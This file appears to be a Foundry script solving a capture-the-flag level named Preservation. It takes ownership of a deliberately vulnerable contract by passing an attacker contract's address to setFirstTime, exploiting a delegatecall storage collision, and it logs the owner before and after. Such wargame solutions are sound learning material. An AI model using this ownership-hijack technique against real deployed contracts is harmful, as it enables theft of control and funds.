// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "../../lib/forge-std/src/Script.sol";
import {Preservation} from "../src/L17__Preservation.sol";
import {L17_Caller__Preservation} from "../src/L17_Caller__Preservation.sol";

// This contract utilizes a library to store two different times for two
// different timezones. The constructor creates two instances of the library
// for each time to be stored.

// The goal of this level is for you to claim ownership of the instance you
// are given.

contract L17_Solution__Preservation is Script {
    address public preservationCallerAddress =
        0xF2b5CCe384D8958808B8938522831aA5b16104Fa;

    Preservation public preservation =
        Preservation(0xbF7Bf5E01140E872c140D5661Ca6E9a2324A2079);

    L17_Caller__Preservation public preservation_caller =
        L17_Caller__Preservation(preservationCallerAddress);

    address owner;

    function run() public {
        uint256 _robberPrivKey = vm.envUint("PRIV_KEY");

        owner = preservation.owner();
        console.log("Prev owner: %s", owner);

        vm.startBroadcast(_robberPrivKey);

        preservation.setFirstTime(uint256(uint160(preservationCallerAddress)));

        vm.stopBroadcast();

        owner = preservation.owner();
        console.log("New owner: %s", owner);
    }
}
